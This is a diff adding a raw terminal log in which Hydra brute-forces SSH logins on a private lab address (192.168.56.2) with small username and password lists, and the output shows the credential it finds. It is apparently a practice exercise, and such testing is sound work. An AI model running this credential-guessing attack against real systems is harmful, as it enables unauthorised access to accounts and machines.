@@ -1,0 +1,39 @@
+└─$ hydra -L u.txt -P p.txt  -V 192.168.56.2 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-15 22:11:11
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
+[DATA] attacking ssh://192.168.56.2:22/
+[ATTEMPT] target 192.168.56.2 - login "aaaa" - pass "111111" - 1 of 25 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "aaaa" - pass "222222" - 2 of 25 [child 1] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "aaaa" - pass "a" - 3 of 25 [child 2] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "aaaa" - pass "333333" - 4 of 25 [child 3] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "aaaa" - pass "444444" - 5 of 25 [child 4] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "bbbb" - pass "111111" - 6 of 25 [child 5] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "bbbb" - pass "222222" - 7 of 25 [child 6] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "bbbb" - pass "a" - 8 of 25 [child 7] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "bbbb" - pass "333333" - 9 of 25 [child 8] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "bbbb" - pass "444444" - 10 of 25 [child 9] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "111111" - 11 of 25 [child 10] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "222222" - 12 of 25 [child 11] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "a" - 13 of 25 [child 12] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "333333" - 14 of 25 [child 13] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "444444" - 15 of 25 [child 14] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "111111" - 16 of 25 [child 15] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "222222" - 17 of 28 [child 2] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "a" - 18 of 28 [child 4] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "333333" - 19 of 28 [child 3] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "444444" - 20 of 28 [child 0] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "111111" - 21 of 28 [child 1] (0/3)
+[22][ssh] host: 192.168.56.2   login: user1   password: a
+[RE-ATTEMPT] target 192.168.56.2 - login "cccc" - pass "111111" - 21 of 28 [child 1] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "222222" - 22 of 28 [child 4] (0/3)
+[RE-ATTEMPT] target 192.168.56.2 - login "cccc" - pass "222222" - 22 of 28 [child 4] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "a" - 23 of 28 [child 7] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "333333" - 24 of 28 [child 8] (0/3)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "444444" - 25 of 28 [child 5] (0/3)
+[REDO-ATTEMPT] target 192.168.56.2 - login "root" - pass "222222" - 26 of 28 [child 9] (1/3)
+[REDO-ATTEMPT] target 192.168.56.2 - login "root" - pass "333333" - 27 of 28 [child 6] (2/3)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-15 22:11:20
